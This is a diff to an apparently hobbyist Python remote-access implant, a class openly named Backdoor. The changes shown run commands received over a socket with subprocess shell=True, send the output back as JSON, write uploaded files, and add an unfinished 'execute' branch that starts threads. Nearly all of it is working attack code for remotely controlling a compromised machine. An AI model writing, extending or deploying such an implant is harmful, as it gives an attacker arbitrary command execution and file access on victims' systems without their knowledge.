@@ -1,4 +1,4 @@
-import subprocess, sys, socket, json, argparse, os, base64, traceback, time
+import subprocess, sys, socket, json, argparse, os, base64, traceback, time, threading
 
 
 class Args:
@@ -42,21 +42,17 @@ class Backdoor:
             
     
     def executeCmd(self,cmd):
-        
         try:
-            if len(cmd) > 1:
-                joinCmd = ' '.join(cmd)
-                #print(joinCmd)
-                cmd = subprocess.check_output(joinCmd,shell=True)
-            else:
-                cmd = subprocess.check_output(cmd,shell=True)
-                
+            cmd = subprocess.check_output(cmd,shell=True)
+            print(cmd)
+           
             return cmd
         except subprocess.CalledProcessError as e:
             return str(e)
     
     
     def sendStream(self,data):
+        print(data)
         ####print(f'sendStream data type: {type(data)}')
         if isinstance(data,str):
 
@@ -76,18 +72,23 @@ class Backdoor:
                     ###print(data['data'])
                     
                     #data = data['data'] #value of data
-                    ####print(f'sendStream dict data: {data}')
-                    ##print(type(data['data'])) #should be string
-                    ##print(type(data)) #should be dict
+                    print(f'sendStream dict data: {data}')
+                    print(type(data['data'])) #should be string
+                    print(type(data)) #should be dict
                     
                     jsData = json.dumps(data)
-                    ####print(jsData)
+                    print(jsData)
                     self.connection.send(str(jsData).encode('utf-8'))
                 else:
                     if isinstance(data['fault'],bytes):
                         data['fault'] = data['fault'].decode()
                     jsData = json.dumps(data)
                     self.connection.send(str(jsData).encode('utf-8'))
+
+
+    def runExecutable(self,exe):
+        exeThread = threading.Thread(target=exe) #does this work??
+        exeThread.start()
 
 
     def recvStream(self):
@@ -176,15 +177,17 @@ class Backdoor:
                 ##print(f'Upload cmd received: {self.cmdIn[1]}')
                 cmdOut = self.write_file(file, content) #[1] is file name we are writing to memory, [2] is the content of the file
                 self.sendStream(cmdOut)
+
+
+            elif self.cmdIn[0] == 'execute':
+                print(self.cmdIn[1]) #should be the exe name
+                #print(threading.enumerate())
+                self.sendStream(threading.enumerate()) # probably will not work with json 
                 
-
-
-
             
             else:   
-                ###print('Try3')
+                print('Try execute cmd')
                 ###print('run3_PRE_TRY')
-                #print(self.cmdIn)      
                 cmdOut = self.executeCmd(self.cmdIn)  
                 ###print(f'{cmdOut[1:20]},{type(cmdOut)}')
                 ###print('run4_POST_TRY')
@@ -207,5 +210,3 @@ except ConnectionResetError:
     sys.exit()
 except ConnectionRefusedError:
     sys.exit()
-
-
